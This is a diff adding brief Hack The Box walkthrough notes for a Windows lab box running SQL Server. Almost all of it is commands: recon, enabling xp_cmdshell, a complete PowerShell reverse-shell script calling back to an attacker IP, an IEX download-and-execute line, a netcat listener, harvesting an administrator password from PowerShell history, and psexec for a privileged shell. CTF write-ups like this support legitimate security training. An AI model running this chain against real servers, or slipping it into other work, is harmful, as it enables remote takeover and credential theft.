@@ -1,0 +1,54 @@
+-----------------------------Hack the box - Example
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -sC -sV -p$ports 10.10.10.27 
+
+45/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+
+----Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.
+
+----Connect to the service with the option -N nopassword
+smbclient -L 10.10.10.27 -N
+
+----Connection:
+smbclient -N //10.10.10.27/backups
+smbclient -N \\\\10.10.10.27\\backups
+
+Install https://github.com/SecureAuthCorp/impacket
+python3 examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+
+----Check admin priviligies: 
+select IS_SRVROLEMEMBER('sysadmin')
+
+----Set up for the RCE (Remote Code Execution)
+EXEC sp_configure 'Show Advanced Options', 1;
+ reconfigure;
+ sp_configure;
+ EXEC sp_configure 'xp_cmdshell', 1
+ reconfigure;
+ xp_cmdshell "whoami"
+
+----Create shell:
+ Echo '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > shell.ps1
+
+----Set up web server:
+ python3 -m http.server 80
+
+----Set up listener:
+ nc -lvnp 443
+
+----Exec backdoor:
+ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.2/shell.ps1\");"
+
+
+----Now we are normal user -> get the root credential to get the box:
+
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+This reveals that the backups drive has been mapped using the local administrator credentials. We can use Impacket's psexec.py to gain a privileged shell.
+
+/examples/psexec.py administrator@10.10.10.27
+
+Get the flag! :)
+type \Users\Adminstrator\Desktop\admin.txt
